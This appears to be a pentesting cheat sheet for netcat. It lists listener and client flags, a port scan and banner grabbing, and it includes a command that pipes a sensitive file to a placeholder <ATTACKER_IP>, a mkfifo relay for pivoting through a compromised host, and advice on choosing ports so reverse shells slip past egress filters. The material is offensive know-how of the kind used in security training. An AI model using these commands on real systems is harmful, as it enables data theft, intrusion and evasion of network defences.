# 🛠️ Netcat (nc)

> **Usage:** The "Swiss Army Knife" of networking. Used for reading/writing data across network connections.

## 📋 Reverse Shell Listener
To catch a reverse shell, you must set up a listener on your machine:
`nc -lvnp 443`

## 📋 The Listener (Server Side)
`nc -lvnp <port>`
* `-l`: **Listen** mode.
* `-v`: **Verbose**. Shows connection details.
* `-n`: **Numeric only**. No DNS resolution.
* `-p`: Specifies the **Port**.
* `-k`: **Keep Open**. Forces Netcat to stay listening after a client disconnects.

## 📡 The Client (Attacker Side)
`nc <IP> <port>`
* `-w <seconds>`: **Timeout**. Connection closes if no response within X seconds.
* `-z`: **Zero-I/O Mode**. Used for port scanning (very basic).
* `-u`: **UDP Mode**. Switch from TCP to UDP.

## 📂 Advanced File Transfer
**On the Target (Send):**
`cat sensitive_file.txt | nc <ATTACKER_IP> 4444`

**On the Attacker (Receive):**
`nc -l -p 4444 > exfiltrated_file.txt`

## 🛡️ Port Scanning with Netcat
While Nmap is better, Netcat is often pre-installed on target systems.
`nc -znv 192.168.1.1 20-80`
*Checks for open ports between 20 and 80.*

## 🐚 Relaying & Pivoting (Advanced)
If you need to pass traffic through a compromised machine to another internal target:
`mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | nc <INTERNAL_IP> 80 > /tmp/f`
*This creates a bidirectional pipe acting as a simple proxy.*

## 💡 Expert Tip: Banner Grabbing
To identify a service manually without Nmap:
`echo "QUIT" | nc -vn <target_IP> <port>`
*This forces the service to reveal its version banner before closing the connection.*

## 💡 Expert Tip: Port Selection
Always try to use "Common" ports for listeners (e.g., **443** for HTTPS or **53** for DNS). Outbound traffic on these ports is rarely blocked by corporate egress filters, making your reverse shell much more likely to succeed.
